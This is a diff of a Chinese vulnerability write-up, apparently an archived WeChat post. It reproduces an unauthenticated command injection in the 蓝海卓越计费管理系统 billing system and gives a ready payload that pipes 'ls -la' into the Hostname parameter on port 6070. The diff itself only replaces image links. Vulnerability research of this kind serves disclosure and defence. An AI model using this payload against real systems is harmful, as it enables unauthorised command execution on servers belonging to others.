@@ -95,19 +95,19 @@ app="蓝海卓越计费管理系统"
 
   
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_gif/vLkXic8TjvxFkZWhz8hicaaDGkF9d7WiaYaOR6oLKHSJ709cLb17NsVDPnLI22YbRibaic33YMUZ5goMxia9UEaw7hRg/640?wx_fmt=gif)
+![](../../.resource/remote/fe6ee76b64b60073372debd47af9dcdb288ea1a2b3f75205b0d03e7b1f19d905.gif)
 
 漏洞复现
 
 漏洞存在点很简单，就是没有对输入的过滤  
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCvticDYCtBFYa1YkU6QvdphRVMXyibDEyEYoCWe6aS9tkZXP4D22mYY0kw/640?wx_fmt=jpeg)
+![](../../.resource/remote/4f0fe75f1fefd160f09c37b85c88eed93c747162fd836ae790e0f0e9b3ad364d.jpg)
 
 执行拼接代码执行，这里有个点需要注意以下，就是接口不能存在，才能进行拼接，当接口不存在的时候，接口调用为空，则后面可以进行拼接
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCvUhmjhsOdtTomSyj32scdp467lSQ67CYxDRCtichpdDc2eciahynPQpYA/640?wx_fmt=jpeg)
+![](../../.resource/remote/7215c9b55c8e094906282af259d6d87329a39970aa185163f7b433e4323fda85.jpg)
 
-无任何其他的过滤操作![](https://mmbiz.qpic.cn/mmbiz_jpg/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCvejE2BygosicYyRXgsGRsobH31HuDltFKchDYiarPX691pupaJPAwd1Zw/640?wx_fmt=jpeg)
+无任何其他的过滤操作![](../../.resource/remote/91759fbc6569f19ebe6b2cab4631ba3a9a4a3a824ad22768f591f094f83f56b1.jpg)
 
 端口一般开在 6070
 
@@ -115,9 +115,9 @@ app="蓝海卓越计费管理系统"
 Hostname=114.114.114.114|ls -la&physicalInterface=1&pingCount=1
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCvo3UAgEfx6saXCvicoicEH8maKiabesOzngKQiaptyYckKt6YryQauzCGbA/640?wx_fmt=png)
+![](../../.resource/remote/834eb519c112713eeeed2e7dfe3bae9633e6def81473015fba772067fd56ac23.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCvkHItOVFudcYH6cP5xj9ealddJrYxtAh70TH8dswqpmEiauHBazb9Y6g/640?wx_fmt=png)
+![](../../.resource/remote/db301260885c882661db1a8e14a20f36141e2e6787c30be7a0bca01e023dcf24.png)
 
            ![](https://mmbiz.qpic.cn/mmbiz/yqVAqoZvDibF4Yt2FQ7OXEVdYnmw5luVibtn7s5Xgo37kJ8QS8Yv3TocRISibmUrXAGf0s3gTia1reAGvbW3x6O0kw/640?wx_fmt=gif)          
 
@@ -127,11 +127,11 @@ Hostname=114.114.114.114|ls -la&physicalInterface=1&pingCount=1
 如有特殊需要请留言，或提交一篇自挖或公网未流出漏洞，即可获取授权  
 如需投稿请后台回复 "投稿" 获取微信，添加微信后直接发送漏洞文章即可。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCvA2Ntxt26WvGNlCsCXRvk9Kt0yCcWcdvky3rWb15jtJ2kew624gWW1A/640?wx_fmt=png)
+![](../../.resource/remote/af70c2ba6bbb18f02e628fcae73cc2f6c574137a3e57cfaac6456f903233dfc0.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCv2txz7VW0vB277NOaHD18qM5f4lSW5MoHSIdNmnhwFzh9Vq3JlibIB1g/640?wx_fmt=png)
+![](../../.resource/remote/fca93cdfca4189025a27669c91b1fa80e781b967d283f81d752bb84a83a871c2.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCvuRz1qDSFibSggh7Mj4vdgXXzAKC78oSbexuTjCBGUHLpQPF7UPCZANQ/640?wx_fmt=png)
+![](../../.resource/remote/81b91686d309615f005e1514d8879b884fc51139b750ecc74fe3732afb9a5213.png)
 
     本站开设的起因是因为某一次 HW，查漏洞真的太麻烦了，就想起来做了一个站点，本意就是自己用来快速检索漏洞详情的，为了方便大家就公开了，但是这样就又会被不法份子利用，和影响一些大佬的权益。  
 
@@ -149,21 +149,21 @@ Hostname=114.114.114.114|ls -la&physicalInterface=1&pingCount=1
 
   
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8Yzhia63knJ4QJFvO4WBfd6KQazjtuPC7uqNBt5gE06ia7GjOVn2RFOicNA/640?wx_fmt=jpeg)
+![](../../.resource/remote/edbe746b63d462b8264c4cdc8bdb6f3eea3031d4a274e271cfb03ab17b8f24e3.jpg)
 
 扫取二维码获取
 
 更多精彩
 
-![](https://mmbiz.qpic.cn/mmbiz_png/TlgiajQKAFPtOYY6tXbF7PrWicaKzENbNF71FLc4vO5nrH2oxBYwErfAHKg2fD520niaCfYbRnPU6teczcpiaH5DKA/640?wx_fmt=png)
+![](../../.resource/remote/ab6c5ecbc93adc192adef1b7c05ca25153b4fc3f9c4963f72d75fa0a3aaee299.png)
 
 Qingy 之安全  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Y8TRQVNlpCW6icC4vu5Pl5JWXPyWdYvGAyfVstVJJvibaT4gWn3Mc0yqMQtWpmzrxibqciazAr5Yuibwib5wILBINfuQ/640?wx_fmt=png)
+![](../../.resource/remote/7b68c0062559511a9826e83699fc6bc7773c7080beb677ea03e8c7544a564dd5.png)
 
                                    ![](https://mmbiz.qpic.cn/mmbiz_gif/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCvwcmL5Lb7OCb4UibtoT1ATGNwpSlJjCQM2dKHqeW9XpalKgocYvNIeibw/640?wx_fmt=gif)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/3pKe8enqDsSibzOy1GzZBhppv9xkibfYXeOiaiaA8qRV6QNITSsAebXibwSVQnwRib6a2T4M8Xfn3MTwTv1PNnsWKoaw/640?wx_fmt=png)
+![](../../.resource/remote/8e57ad757dd628c11c5d5fecfeb91ca234ca60712b2f65d6b1294044233f5a75.png)
 
 点个在看你最好看
 
